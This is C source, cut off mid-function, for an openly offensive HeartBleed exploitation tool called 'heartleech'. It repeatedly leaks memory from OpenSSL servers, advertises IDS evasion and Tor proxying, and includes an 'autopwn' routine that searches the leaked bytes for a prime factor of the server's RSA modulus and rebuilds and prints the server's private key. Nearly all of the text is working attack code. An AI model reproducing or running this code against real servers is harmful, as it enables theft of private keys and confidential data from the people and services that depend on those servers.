/*

    HEARTLEECH

    A program for exploiting Neel Mehta's "HeartBleed" bug. This program has
    the following features:

    [IDS-EVASION] Many IDSs trigger on the pattern |18 03| transmitted as the
    first two bytes of the TCP payload. This program buries that pattern
    deeper in the payload in the to-server direction, evading the IDS for
    incoming packets. However, it can't control the responses well, so
    IDSs will often detect responses in the from-server direction.

    [SAFE/VULNERABLE/INCONCLUSIVE] When doing a `--scan` to simply test if the
    target is vulnerable, system are only marked "SAFE" is the system knows
    for sure that they are safe, such as if they are patched or don't support
    heartbeats. Otherwise, systems are marked "INCONCLUSIVE" (or, of course,
    "VULNERABLE" if they respond with a bleed).

    [ENCRYPTION] Most tools do heartbleeds during the handshake, unencrypted.
    This tool does the heartbleed post-handshake, when it's encrypted. This
    means this tool has to be compiled/linked with an OpenSSL library, which
    is the main difficulty using the tool.

    [LOOPING] This tool doesn't do a single bleed, but loops doing the request
    over and over, generating large dump files that can be post-processed to
    find secrets.

    [Socks5n] This tool supports the Socks5n proxying for use with Tor.
    It embeds the hostname inside the Socks protocol, meaning that no DNS
    lookup happens from this this machine. Instead, the Tor exit server is
    responsible for the DNS lookup.

    [IPV6] This tool fully supports IPv6, including for such things as
    proxying. Indeed, if the an AAAA record is the first record to come
    back, then you may be using IPv6 without realizing it.

    [ASYNC/MEM-BIO] Normally, OpenSSL takes care of the underlying sockets
    connections for you. In this program, in order to support things like
    IDS evasion, proxying, and STARTTLS, the program has to deal with sockets
    separately. It's good sample code for working with this mode of OpenSSL.

*/

/*
 * Legacy Windows stuff
 */
#define _CRT_SECURE_NO_WARNINGS 1
#if defined(WIN32)
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <intrin.h>
#include <process.h>
#define snprintf _snprintf
#define sleep(secs) Sleep(1000*(secs))
#define WSA(err) (WSA##err)
#define strdup _strdup
#define dlopen(name, flags) LoadLibraryA(name)
#define dlsym(handle, name) (void (*)(void))GetProcAddress(handle, name)
typedef CRITICAL_SECTION pthread_mutex_t;
#define pthread_mutex_lock(p) EnterCriticalSection(p)
#define pthread_mutex_unlock(p) LeaveCriticalSection(p)
#define pthread_mutex_init(p,q) InitializeCriticalSection(p)
typedef uintptr_t pthread_t;
#define __sync_fetch_and_add(p,n) InterlockedExchangeAdd(p, n)
#define __sync_fetch_and_sub(p,n) InterlockedExchangeAdd(p, -(n))
#define pthread_create(handle,x,pfn,data) (*(handle)) = _beginthread(pfn,0,data)
#define usleep(microseconds) Sleep((microseconds)/1000)
#else
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <dlfcn.h>
#include <pthread.h>
#define WSAGetLastError() (errno)
#define closesocket(fd) close(fd)
#define WSA(err) (err)
#endif
#if defined(_MSC_VER)
#pragma comment(lib, "ws2_32")
#pragma comment(lib, "libeay32.lib")
#pragma comment(lib, "ssleay32.lib")
#endif

#include <ctype.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>

/*
 * OpenSSL specific includes. We also define an OpenSSL internal
 * function that is normally not exposed in include files, so
 * that we can format our 'bleed' manually.
 */
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/rsa.h>


/*
 * This is an internal function, not declared in headers, we we
 * have to declare our own version
 */
int ssl3_write_bytes(SSL *s, int type, const void *buf_, int len);

#ifndef TLS1_RT_HEARTBEAT
#error You are using the wrong version of OpenSSL headers.
#endif

/*
 * Portability note for 'send()':
 * - Windows doesn't generate signals on send failures
 * - Mac/BSD needs a setsockopt
 * - Linux needs this parameter to 'send()'
 */
#if !defined(MSG_NOSIGNAL)
#define MSG_NOSIGNAL 0
#endif

/*
 * Use '-d' option to get more verbose debug logging while running
 * the scan
 */
int is_debug = 0;
int is_scan = 0;


/**
 * The "scan-result" verdict, whether the system is vulnerable, safe, or
 * inconclusive
 */
enum {
    Verdict_Unknown = 0,
    Verdict_Safe,
    Verdict_Vulnerable,
    Verdict_Inconclusive,
    Verdict_Inconclusive_NoTcp,
    Verdict_Inconclusive_NoSsl,
    Verdict_Inconclusive_NoDNS,
};

/**
 * Some PCRE patterns for search content
 */
struct CapturePatterns {
    struct pcre **pat;
    struct pcre_extra **extra;
    size_t count;
};


/**
 * Per connection data that is flushed at the end of the connection
 */
struct Connection {
    const struct DumpArgs *args;
    struct Target *target;
    struct {
        unsigned attempted; /* incremented when we transmit */
        unsigned succeeded; /* incremented when BLEED received */
        unsigned failed;    /* incremented when BEAT received */
    } heartbleeds;
    struct {
        unsigned bytes_expecting;
        unsigned bytes_received;
    } event;
    unsigned is_alert:1;
    unsigned is_sent_good_heartbeat:1;

    size_t buf2_count;
    unsigned char buf2[70000];

};

/**
 * The type of handshake to do, such as SMTP STARTTLS
 */
enum {
    APP_NONE,
    APP_FTP,
    APP_SMTP,
    APP_HTTP,
    APP_POP3,
    APP_IMAP4,
    APP_LDAP,
    APP_NNTP,
    APP_ACAP,
    APP_POSTGRES,
    APP_XMPP,
    APP_TELNET,
    APP_IRC,
    APP_SNMP,
};

/**
 * Default handshake types for some well-known ports
 */
struct Applications {
    unsigned port;
    unsigned is_starttls;
    unsigned type;
} default_protos[] = {
    {  21, 1, APP_FTP},
    {  25, 1, APP_SMTP},
    {  80, 1, APP_HTTP},
    { 110, 1, APP_POP3},
    { 143, 1, APP_IMAP4},
    { 389, 1, APP_LDAP},
    { 433, 1, APP_NNTP},
    { 443, 0, APP_HTTP},
    { 465, 0, APP_SMTP},
    { 563, 0, APP_NNTP},
    { 587, 1, APP_SMTP},
    { 636, 0, APP_LDAP},
    { 674, 1, APP_ACAP},
    //{ 989, 0, APP_FTP_DATA}, //source port, not dest port
    { 990, 0, APP_FTP},  /* command channel */
    { 992, 0, APP_TELNET},
    { 993, 0, APP_IMAP4},
    { 994, 0, APP_IRC},
    { 995, 0, APP_POP3},
    {5222, 1, APP_XMPP}, /* http://xmpp.org/extensions/xep-0035.html */
    {5269, 1, APP_XMPP}, /* http://xmpp.org/extensions/xep-0035.html */
    {5432, 1, APP_POSTGRES},
    {10161, 0, APP_SNMP}, /* SNMP over (D)TLS RFC 5953 test.net-snmp.org */
    {10162, 0, APP_SNMP}, /* traps listener */
    {0,0,0}
};


unsigned
port_to_app(unsigned port, unsigned *is_starttls)
{
    unsigned i;
    for (i=0; default_protos[i].type; i++) {
        if (default_protos[i].port == port) {
            *is_starttls = default_protos[i].is_starttls;
            return default_protos[i].type;
        }
    }
    return 0;
}


/**
 * Structure for one fo the targets that we are scanning
 */
struct Target {
    char *hostname;
    unsigned port;
    struct {
        unsigned desired;
        unsigned done;
    } loop;
    int scan_result;
    char *http_request;
    unsigned starttls;
    unsigned application;
    BIGNUM n;
    BIGNUM e;
};

struct TargetList {
    size_t count;
    size_t max;
    struct Target *list;
};

/**
 * Which operation we are performing
 */
enum Operation {
    Op_None,
    Op_Error,
    Op_Dump,
    Op_Autopwn,
    Op_Scan,
    Op_Offline,
};

/**
 * Arguments for the heartbleed callback function. We read these from the
 * command line and pass them to the threads
 */
struct DumpArgs {
    pthread_mutex_t mutex;
    enum Operation op;
    unsigned is_scan:1;
    FILE *fp;
    char *cert_filename;
    char *dump_filename;
    char *offline_filename;
    unsigned timeout;
    unsigned cfg_loopcount;
    int handshake_type;
    unsigned is_error;
    unsigned is_auto_pwn;
    unsigned is_rand_size;
    unsigned ip_ver;
    unsigned is_raw;
    unsigned long long total_bytes;
    struct {
        char *host;
        unsigned port;
    } proxy;
    struct TargetList targets;
    unsigned default_port;
    struct CapturePatterns patterns;
    struct {
        unsigned desired; /* number of desired threads, configed */
        volatile unsigned running; /* number of threads actually started */
    } threads;
};


static void print_status(const struct DumpArgs *args)
{
    static time_t last_status = 0;
    static unsigned long long last_total_bytes = 0;
    if (last_status + 1 <= time(0)) {
        if (!args->is_scan)
            fprintf(stderr, "%llu bytes downloaded (%5.3f-mbps)\r", 
            args->total_bytes,
            ((args->total_bytes-last_total_bytes)*8.0)/1000000.0 );
        last_status = time(0);
        last_total_bytes = args->total_bytes;
    }
}

/******************************************************************************
 ******************************************************************************/
int ERROR_MSG(const char *fmt, ...)
{
    va_list marker;
    if (is_scan && !is_debug)
        return -1;
    va_start(marker, fmt);
    vfprintf(stderr, fmt, marker);
    va_end(marker);
    return -1;
}

int DEBUG_MSG(const char *fmt, ...)
{
    va_list marker;
    if (!is_debug)
        return -1;
    va_start(marker, fmt);
    vfprintf(stderr, fmt, marker);
    va_end(marker);
    return -1;
}


/******************************************************************************
 * Prints a typical hexdump, for debug purposes.
 ******************************************************************************/
static void
hexdump(const unsigned char *buf, size_t len)
{
    size_t i;

    for (i=0; i<len; i += 16) {
        size_t j;

        printf("%04x ", (unsigned)i);
        for (j=i; j<len && j<i+16; j++) {
            printf("%02x ", buf[j]);
        }
        for ( ; j<i+16; j++)
            printf("   ");

        for (j=i; j<len && j<i+16; j++) {
            if (buf[j] == ' ')
                printf("%c", buf[j]);
            else if (isprint(buf[j]) && !isspace(buf[j]))
                printf("%c", buf[j]);
            else
                printf(".");
        }
        printf("\n");
    }
}

/******************************************************************************
 ******************************************************************************/
struct pcre;
struct pcre_extra;
typedef struct pcre *(*PCRE_compile)(const char *pattern, int options,
                            const char **errptr, int *erroffset,
                            const unsigned char *tableptr);
typedef int (*PCRE_exec)(const struct pcre *code,
                const struct pcre_extra *extra, const char *subject, int length,
                int startoffset, int options, int *ovector, int ovecsize);
typedef struct pcre_extra *(*PCRE_study)(const struct pcre *code, int options,
                const char **errptr);
typedef const char *(*PCRE_version)(void);
struct PCRE {
    PCRE_compile compile;
    PCRE_exec exec;
    PCRE_version version;
    PCRE_study study;
} PCRE;




/******************************************************************************
 ******************************************************************************/
static void
pattern_add(struct CapturePatterns *pats, const char *pattern)
{
    struct pcre *p;
    struct pcre_extra *extra;
    const char *err;
    int err_offset;

    if (PCRE.version == NULL)
        return;

    p = PCRE.compile(pattern, 0, &err, &err_offset, 0);
    if (p == NULL) {
        int i;
        fprintf(stderr, "PCRE: %s\n", err);
        fprintf(stderr, "      %s\n", pattern);
        for (i=0; i<6+err_offset; i++)
            fprintf(stderr, " ");
        fprintf(stderr, "^\n");
        return;
    }
    extra = PCRE.study(p, 0, &err);

    if (pats->count == 0) {
        pats->pat = malloc(sizeof(p));
        pats->extra = malloc(sizeof(extra));
    } else {
        pats->pat = realloc(pats->pat, sizeof(p) * (pats->count+1));
        pats->extra = realloc(pats->extra, sizeof(extra) * (pats->count+1));
    }

    pats->pat[pats->count] = p;
    pats->extra[pats->count] = extra;
    pats->count++;
}


/******************************************************************************
 * Load the PCRE library for capturing patterns.
 ******************************************************************************/
static void
load_pcre(void)
{
    void *h;
    const char *library_names[] = {
#if defined(__linux__)
        "libpcre.so",
#elif defined(WIN32)
        "pcre3.dll",
#else
        "libpcre.dylib",
#endif
        0 };
    size_t i;

    /* look for a PCRE library */
    for (i=0; library_names[i]; i++) {
        h = dlopen(library_names[i], RTLD_LAZY);
        if (h)
            break;
#ifndef WIN32
        fprintf(stderr, "%s: %s\n", library_names[i], dlerror());
#endif
    }
    if (h == NULL)
        return;

    /* load symbols */
    PCRE.compile = (PCRE_compile)dlsym(h, "pcre_compile");
    if (PCRE.compile == NULL) {
        perror("pcre_compile");
        return;
    }
    PCRE.study = (PCRE_study)dlsym(h, "pcre_study");
    if (PCRE.study == NULL) {
        perror("pcre_study");
        return;
    }
    PCRE.exec = (PCRE_exec)dlsym(h, "pcre_exec");
    if (PCRE.exec == NULL) {
        perror("pcre_exec");
        return;
    }
    PCRE.version = (PCRE_version)dlsym(h, "pcre_version");
    if (PCRE.version == NULL) {
        perror("pcre_version");
        return;
    }

    fprintf(stderr, "PCRE library: %s\n", PCRE.version());
}

void connection_buf_init(struct Connection *connection)
{
    connection->buf2_count = 0;
}

void connection_buf_append(struct Connection *connection, const void *buf, size_t length)
{
    if (length > sizeof(connection->buf2) - connection->buf2_count)
        length = sizeof(connection->buf2) - connection->buf2_count;
    memcpy(connection->buf2 + connection->buf2_count, buf, length);
    connection->buf2_count += length;
}


/******************************************************************************
 * This is the "callback" that receives the hearbeat data. Since
 * hearbeat is a control function and not part of the normal data stream
 * it can't be read normally. Instead, we have to install a hook within
 * the OpenSSL core to intercept them.
 ******************************************************************************/
static void
receive_heartbeat(int write_p, int version, int content_type,
            const void *vbuf, size_t len, SSL *ssl,
            void *arg)
{
    struct Connection *connection = (struct Connection *)arg;
    struct Target * target = connection->target;
    const struct DumpArgs *args = connection->args;
    const unsigned char *buf = (const unsigned char *)vbuf;

    /*
     * Ignore anything that isn't a "hearbeat". This function hooks
     * every OpenSSL-internal message, but we only care about
     * the hearbeats.
     */
    switch (content_type) {
    case SSL3_RT_CHANGE_CIPHER_SPEC: /* 20 */
    case SSL3_RT_HANDSHAKE: /* 22 */
    case SSL3_RT_APPLICATION_DATA: /* 23 */
    case 256: /* ???? why this? */
        return;
    case SSL3_RT_ALERT: /* 21 */
        if (buf[0] == 2) {
            DEBUG_MSG("[-] ALERT fatal %u len=%u\n", buf[1], len);
        } else {
            switch (buf[1]) {
                case SSL3_AD_CLOSE_NOTIFY:
                    DEBUG_MSG("[-] ALERT warning: connection closing\n");
                    break;
                default:
                    DEBUG_MSG("[-] ALERT warning %u len=%u\n", buf[1], len);
                    break;
            }
        }
        connection->is_alert = 1;
        return;
    case TLS1_RT_HEARTBEAT:
        break; /* handle below */
    default:
        ERROR_MSG("[-] msg_callback:%u: unknown type seen\n", content_type);
        return;
    }

    /* Record how many bytes we've received, so that we can known when we've
     * received all the heartbeat */
    connection->event.bytes_received += len;

    /*
     * See if this is a "good" heartbeat, which we send to probe
     * the system in order to see if it's been patched.
     */
    if (connection->is_sent_good_heartbeat && len < 60) {
        static const char *good_response =
            "\x02\x00\x12"
            "aaaaaaaaaaaaaaaa"
            "aaaaaaaaaaaaaaaa"
            "aaaaaaaaaaaaaaaa"
            ;
        if (memcmp(buf, good_response, 0x12+3) == 0) {
            ERROR_MSG("[-] PATCHED: heartBEAT received, but not BLEED\n");
            connection->heartbleeds.failed++;
            target->scan_result = Verdict_Safe;
            return;
        }
    }

    /*
     * Inform user that we got some bleeding data
     */
    DEBUG_MSG("[+] %5u-bytes bleed received\n", (unsigned)len);

    /*
     * Copy this to the buffer
     */
    connection_buf_append(connection, buf, len);

    /*
     * Display bytes if not dumping to file
     */
    if (!args->fp && is_debug && !args->is_scan) {
        hexdump(buf, len);
    }

    /* Count this, to verify that bleeds are working */
    connection->heartbleeds.succeeded++;
}


/******************************************************************************
 * Wrapper function for printing addresses, since the standard
 * "inet_ntop()" function doesn't automatically grab the 'family' from
 * the socket structure to begin with
 ******************************************************************************/
static const char *
my_inet_ntop(struct sockaddr *sa, char *dst, size_t sizeof_dst)
{
#if defined(WIN32)
    /* WinXP doesn't have 'inet_ntop()', but it does have another WinSock
     * function that takes care of this for us */
    {
        DWORD len = (DWORD)sizeof_dst;
        WSAAddressToStringA(sa, sizeof(struct sockaddr_in6), NULL,
                            dst, &len);
    }
#else
    switch (sa->sa_family) {
    case AF_INET:
        inet_ntop(AF_INET, &(((struct sockaddr_in *)sa)->sin_addr),
                dst, sizeof_dst);
        break;
    case AF_INET6:
        inet_ntop(AF_INET6, &(((struct sockaddr_in6 *)sa)->sin6_addr),
                dst, sizeof_dst);
        break;
    default:
        dst[0] = '\0';
    }
#endif
    return dst;
}


/******************************************************************************
 * WinXP doesn't have standard 'inet_pton' function, we put this work around
 * here
 ******************************************************************************/
#if defined(WIN32)
int
x_inet_pton(int family, const char *hostname, struct sockaddr *sa)
{
    int sizeof_sa;
    int x;

    switch (family) {
    case AF_INET: sizeof_sa = sizeof(struct sockaddr_in); break;
    case AF_INET6: sizeof_sa = sizeof(struct sockaddr_in6); break;
    default: sizeof_sa = sizeof(struct sockaddr); break;
    }

    x = WSAStringToAddressA(
                (char*)hostname,
                family,
                NULL,
                sa,
                &sizeof_sa);

    /* Windows and Unix function disagree on success/failure codes */
    if (x == 0)
        return 1;
    else
        return 0;
}
#define inet_pton x_inet_pton
#endif


/******************************************************************************
 * Parse a network address, converting the text form into a binary form.
 * Note that this is designed for use with the Sock5n implementation, so
 * it's not a general purpose function.
 ******************************************************************************/
static size_t
my_inet_pton(const char *hostname,
                unsigned char *dst, size_t offset, size_t max,
                unsigned char *type)
{
    size_t len;


#if defined(WIN32)
    if (max-offset >= sizeof(struct sockaddr_in)) {
        struct sockaddr_in sin;

        if (inet_pton(AF_INET, hostname, (struct sockaddr*)&sin) == 1) {
            memcpy(&dst[offset], &sin.sin_addr, 4);
            *type = 1; /* socks5 type = IPv4 */
            return offset + 4;
        }
    }
#else
    if (max-offset >= 4
        && inet_pton(AF_INET, hostname, &dst[offset]) == 1) {
        *type = 1; /* socks5 type = IPv4 */
        return offset + 4;
    }
#endif

#if defined(WIN32)
    if (max-offset >= 16) {
        struct sockaddr_in6 sin6;
        if (inet_pton(AF_INET6, hostname, (struct sockaddr*)&sin6) == 1) {
            memcpy(&dst[offset], &sin6.sin6_addr, 16);
            *type = 4; /* socks5 type = IPv6*/
            return offset + 16;
        }
    }
#else
    if (max-offset >= 16
        && inet_pton(AF_INET6, hostname, &dst[offset]) == 1) {
        *type = 4; /* socks5 type = IPv6*/
        return offset + 16;
    }
#endif

    len = strlen(hostname);
    if (offset + len + 1 <= max) {
        dst[offset] = (unsigned char)len;
        memcpy(&dst[offset+1], hostname, len);
    }
    *type = 3; /*socks5 type = domainname */
    return offset + len + 1;
}



/******************************************************************************
 * Given two primes, generate an RSA key. From RFC 3447 Appendix A.1.2
 *
    RSAPrivateKey ::= SEQUENCE {
          version           Version,
          modulus           INTEGER,  -- n
          publicExponent    INTEGER,  -- e
          privateExponent   INTEGER,  -- d
          prime1            INTEGER,  -- p
          prime2            INTEGER,  -- q
          exponent1         INTEGER,  -- d mod (p-1)
          exponent2         INTEGER,  -- d mod (q-1)
          coefficient       INTEGER,  -- (inverse of q) mod p
          otherPrimeInfos   OtherPrimeInfos OPTIONAL
      }
 ******************************************************************************/
static RSA *
rsa_gen(const BIGNUM *p, const BIGNUM *q, const BIGNUM *e)
{
    BN_CTX *ctx = BN_CTX_new();
    RSA *rsa = RSA_new();
    BIGNUM p1[1], q1[1], r[1];

    BN_init(p1);
    BN_init(q1);
    BN_init(r);

    rsa->p = BN_new();
    BN_copy(rsa->p, p);
    rsa->q = BN_new();
    BN_copy(rsa->q, q);
    rsa->e = BN_new();
    BN_copy(rsa->e, e);

    /*
     * n - modulus (should be same as original cert, but we
     * recalculate it here
     */
    rsa->n = BN_new();
    BN_mul(rsa->n, rsa->p, rsa->q, ctx);

    /*
     * d - the private exponent
     */
    rsa->d = BN_new();
    BN_sub(p1, rsa->p, BN_value_one());
    BN_sub(q1, rsa->q, BN_value_one());
    BN_mul(r,p1,q1,ctx);
    BN_mod_inverse(rsa->d, rsa->e, r, ctx);

    /* calculate d mod (p-1) */
    rsa->dmp1 = BN_new();
    BN_mod(rsa->dmp1, rsa->d, p1, ctx);

    /* calculate d mod (q-1) */
    rsa->dmq1 = BN_new();
    BN_mod(rsa->dmq1, rsa->d, q1, ctx);

    /* calculate inverse of q mod p */
    rsa->iqmp = BN_new();
    BN_mod_inverse(rsa->iqmp, rsa->q, rsa->p, ctx);



    BN_free(p1);
    BN_free(q1);
    BN_free(r);

    BN_CTX_free(ctx);

    return rsa;
}

/******************************************************************************
 * This function searches a buffer looking for a prime that is a factor
 * of the public key
 ******************************************************************************/
static int
find_private_key(const BIGNUM n, const BIGNUM e,
                 const unsigned char *buf, size_t buf_length)
{
    size_t i;
    int prime_length = n.top * sizeof(BN_ULONG);
    BN_CTX *ctx;
    BIGNUM p;
    BIGNUM q;
    BIGNUM remainder;

    BN_init(&q);
    BN_init(&remainder);
    BN_init(&p);

    /* Need enough target data to hold at least one prime number */
    if (buf_length < (size_t)prime_length)
        return 0;

    ctx = BN_CTX_new();

    /* Go forward one byte at a time through the buffer */
    for (i=0; i<buf_length-prime_length; i++) {

        /* Grab a possible little-endian prime number from the buffer.
         * [NOTE] this assumes the target machine and this machine have
         * roughly the same CPU (i.e. x86). If the target machine is
         * a big-endian SPARC, but this machine is a little endian x86,
         * then this technique won't work.*/
        p.d = (BN_ULONG*)(buf+i);
        p.dmax = n.top/2;
        p.top = p.dmax;

        /* [optimization] Only process odd numbers, because even numbers
         * aren't prime. This doubles the speed. */
        if (!(p.d[0]&1))
            continue;

        /* [optimization] Make sure the top bits aren't zero. Firstly,
         * this won't be true for the large primes in question. Secondly,
         * a lot of bytes in dumps are zeroed out, causing this condition
         * to be true a lot. Not only does this quickly weed out target
         * primes, it takes BN_div() a very long time to divide when
         * numbers have leading zeroes
         */
        if (p.d[p.top-1] == 0)
            continue;

        /* Do the division, grabbing the remainder */
        BN_div(&q, &remainder, &n, &p, ctx);
        if (!BN_is_zero(&remainder))
            continue;

        /* We have a match! Let's create an X509 certificate from this */
        {
            RSA *rsa;
            BIO *out = BIO_new(BIO_s_file());

            fprintf(stderr, "\n");
            BIO_set_fp(out,stdout,BIO_NOCLOSE);

            rsa = rsa_gen(&p, &q, &e);
            PEM_write_bio_RSAPrivateKey(out, rsa, NULL, NULL, 0, NULL, NULL);

            /* the program doesn't need to continue */
            exit(0);
        }
    }

    BN_free(&q);
    BN_free(&remainder);
    BN_CTX_free(ctx);

    return 0;
}



/******************************************************************************
 * After reading a chunk of data, this function will process that chunk.
 * There are three things we might do with that data:
 *  1. save to a file for later offline processing
 *  2. search for private key
 *  3. hexdump to the command-line
 ******************************************************************************/
static size_t
process_bleed(const struct DumpArgs *args_in,
              const unsigned char *buf, size_t buf_size,
              BIGNUM n, BIGNUM e)
{
    struct DumpArgs *args = (struct DumpArgs*)args_in;
    size_t x;

    /* ignore empty chunks */
    if (buf_size == 0)
        return 0;
    
    pthread_mutex_lock(&args->mutex);

    /* track total bytes processed, for printing to the command-line */
    args->total_bytes += buf_size;

    /* write a copy of the bleeding data to a file for offline processing
     * by other tools */
    if (args->fp) {
        x = fwrite(buf, 1, buf_size, args->fp);
        if (x != buf_size) {
            ERROR_MSG("[-] %s: %s\n", args->dump_filename, strerror(errno));
        }
    }

    /* do a live analysis of the bleeding data */
    if (args->is_auto_pwn) {
        if (find_private_key(n, e, buf, buf_size)) {
            ; //printf("key found!\n");
            //exit(1);
        }

    }

    pthread_mutex_unlock(&args->mutex);

    return buf_size;
}



/******************************************************************************
 * Parse details from a certificate. We use this in order to grab
 * the 'modulus' from the certificate in order to crack it with
 * patterns found in memory. This is called in two places. One is when
 * we get the certificate from the server when connecting to it.
 * The other is offline cracking from files.
 **************************************************&&**************************/
static void
parse_cert(X509 *cert, char name[512], BIGNUM *modulus, BIGNUM *e)
{
    X509_NAME *subj;
    EVP_PKEY *rsakey;

    /* we grab the server's name for debugging perposes */
    subj = X509_get_subject_name(cert);
    if (subj) {
        int len;
        len = X509_NAME_get_text_by_NID(subj, NID_commonName,
                                        name, 512);
        if (len > 0) {
            name[255] = '\0';
            DEBUG_MSG("[+] servername = %s\n", name);
        }
    }

    /* we grab the 'modulus' (n) and the 'public exponenet' (e) for use
     * with private key search in the data */
    rsakey = X509_get_pubkey(cert);
    if (rsakey && rsakey->type == 6) {
        BIGNUM *n = rsakey->pkey.rsa->n;
        memcpy(modulus, n, sizeof(*modulus));
        memcpy(e, rsakey->pkey.rsa->e, sizeof(*e));
        DEBUG_MSG("[+] RSA public-key length = %u-bits\n",
                                    n->top * sizeof(BN_ULONG) * 8);
    }
}



/******************************************************************************
 * Translate sockets error codes to helpful text for printing
 ******************************************************************************/
static const char *
error_msg(unsigned err)
{
    switch (err) {
    case WSA(ECONNRESET): return "TCP connection reset";
    case WSA(ECONNREFUSED): return "Connection refused";
    case WSA(ETIMEDOUT): return "Timed out";
    case WSA(ECONNABORTED): return "Connection aborted";
    case 0: return "TCP connection closed";
    default:   return "network error";
    }
}



/******************************************************************************
 * Use 'select()' to see if there is incoming data on the TCP connection.
 * This is just a typical use of select(), so that we don't block on the
 * socket.
 ******************************************************************************/
static unsigned
is_incoming_data(int fd)
{
    int x;
    struct timeval tv;
    fd_set readset;
    fd_set writeset;
    fd_set exceptset;

    FD_ZERO(&readset);
    FD_ZERO(&writeset);
    FD_ZERO(&exceptset);
    FD_SET(fd, &readset);
    FD_SET(fd, &writeset);
    FD_SET(fd, &exceptset);
    tv.tv_sec = 0;
    tv.tv_usec = 1000;
    x = select((int)fd+1, &readset, NULL, &exceptset, &tv);
    if (x > 0)
        return 1; /*true, there's incoming data waiting */
    else
        return 0; /* false, nothing has been received */
}


/******************************************************************************
 * Does the proxy connection. Currently, we only support Socks5n for
 * use with Tor
 ******************************************************************************/
static int
proxy_handshake(int fd,
                const struct DumpArgs *args, const struct Target *target)
{
    unsigned char foo[512];
    unsigned offset;
    char proxy_address[300] = "";
    unsigned proxy_port = 0;
    time_t start_time;
    int x;

    /*
     * negotiate version=5, passwords=none
     */
    x = send(fd, "\x05\x01\x00", 3, MSG_NOSIGNAL);
    if (x < 3) {
        ERROR_MSG("[-] proxy handshake: %s (%u)\n",
            error_msg(WSAGetLastError()), WSAGetLastError());
        return -1;
    }

    /*
     * read the negotiated response
     */
    start_time = time(0);
    while (!is_incoming_data(fd)) {
        if (start_time + args->timeout < time(0)) {
            ERROR_MSG("[-] proxy handshake: timed out\n");
            return -1;
        }
    }
    x = recv(fd, (char*)foo, 2, 0);
    if (x != 2) {
        ERROR_MSG("[-] proxy handshake: %s (%u)\n",
            error_msg(WSAGetLastError()), WSAGetLastError());
        return -1;
    }

    /*
     * Parse the response negotiation
     */
    if (foo[0] != 5) {
        ERROR_MSG("[-] proxy handshake: not Socks5\n");
        return -1;
    }
    if (foo[1] != 0) {
        ERROR_MSG("[-] proxy handshake: requires authentication\n");
        return -1;
    }

    /*
     * send connect requrest
     */
    foo[0] = 5; /*version = socks5 */
    foo[1] = 1; /*cmd = connect*/
    foo[2] = 0; /*reserved*/
    offset = my_inet_pton(target->hostname, foo, 4, sizeof(foo), &foo[3]);
    if (offset + 2 < sizeof(foo)) {
        foo[offset++] = (unsigned char)(target->port>>8);
        foo[offset++] = (unsigned char)(target->port>>0);
    }
    x = send(fd, (char*)foo, offset, MSG_NOSIGNAL);
    if (x != offset) {
        ERROR_MSG("[-] proxied connect: %s (%u)\n",
            error_msg(WSAGetLastError()), WSAGetLastError());
        return -1;
    }

    /*
     * Now check the reply to see if we've succeeded
     */
    start_time = time(0);
    while (!is_incoming_data(fd)) {
        if (start_time + args->timeout < time(0)) {
            ERROR_MSG("[-] proxied connect: timed out\n");
            return -1;
        }
    }
    x = recv(fd, (char*)foo, sizeof(foo), 0);
    if (x == 0) {
        ERROR_MSG("[-] proxied connect: %s (%u)\n",
            error_msg(WSAGetLastError()), WSAGetLastError());
        return -1;
    }

    /*
     * Parse the response
     */
    if (foo[0] != 5) {
        ERROR_MSG("[-] proxied connect: corrupted result\n");
        return -1;
    }
    if (foo[1]) {
        switch (foo[1]) {
        case 0: break;
        case 1: ERROR_MSG("[-] proxy error: general failure\n"); break;
        case 2: ERROR_MSG("[-] proxy error: firewalled\n"); break;
        case 3: ERROR_MSG("[-] proxy error: net unreachable\n"); break;
        case 4: ERROR_MSG("[-] proxy error: host unreachable\n"); break;
        case 5: ERROR_MSG("[-] proxy error: connection refused\n"); break;
        case 6: ERROR_MSG("[-] proxy error: TTL expired\n"); break;
        case 7: ERROR_MSG("[-] proxy error: command not supported\n"); break;
        case 8: ERROR_MSG("[-] proxy error: IPv6 not supported\n"); break;
        default: ERROR_MSG("[-] proxy error: unknown error\n"); break;
        }
        return -1;
    }

    switch (foo[3]) {
    case 1:
        if (x != 10) {
            ERROR_MSG("[-] proxy returned unexpected data\n");
            ERROR_MSG("[-] %02x:%02x:%02x:%02x:%02x\n",
                foo[0], foo[1], foo[2], foo[3], foo[4]);
            return -1;
        } else {
            struct sockaddr_in sin;
            sin.sin_family = AF_INET;
            memcpy(&sin.sin_addr, foo+4, 4);
            memcpy(&sin.sin_port, foo+8, 2);
            my_inet_ntop((struct sockaddr*)&sin,
                         proxy_address, sizeof(proxy_address));
        }
        break;
    case 4:
        if (x != 22) {
            ERROR_MSG("[-] proxy returned unexpected data\n");
            ERROR_MSG("[-] %02x:%02x:%02x:%02x:%02x\n",
                foo[0], foo[1], foo[2], foo[3], foo[4]);
            return -1;
        } else {
            struct sockaddr_in6 sin6;
            sin6.sin6_family = AF_INET;
            memcpy(&sin6.sin6_addr, foo+4, 4);
            memcpy(&sin6.sin6_port, foo+8, 2);
            my_inet_ntop((struct sockaddr*)&sin6,
                         proxy_address, sizeof(proxy_address));
        }
        break;
    case 3:
        if (x < 7 || x != 7 + foo[4]) {
            ERROR_MSG("[-] proxy returned unexpected data\n");
            ERROR_MSG("[-] %02x:%02x:%02x:%02x:%02x\n",
                foo[0], foo[1], foo[2], foo[3], foo[4]);
            return -1;
        } else {
            memcpy(proxy_address, foo+5, foo[4]);
            proxy_address[foo[4]] = '\0';
        }
    default:
        ERROR_MSG("[-] proxy returned unexpected data\n");
            ERROR_MSG("[-] %02x:%02x:%02x:%02x:%02x\n",
                foo[0], foo[1], foo[2], foo[3], foo[4]);
        return -1;
    }

    DEBUG_MSG("[+] proxy connected through: %s:%u\n",
                                                    proxy_address, proxy_port);
    return 0;
}


/******************************************************************************
 * Used in text-based protocols like SMTP, FTP, POP3, and IMAP to receive
 * the next line of text.
 ******************************************************************************/
static int
recv_line(  int fd,
            unsigned char *line, unsigned *offset, unsigned max,
            unsigned timeout)
{
    time_t start_time = time(0);
    size_t len;

    for (;;) {
        char c;

        /* wait for incoming data */
        while (!is_incoming_data(fd)) {
            if (start_time + timeout < time(0)) {
                ERROR_MSG("[-] starttls handshake: timed out\n");
                return -1;
            }
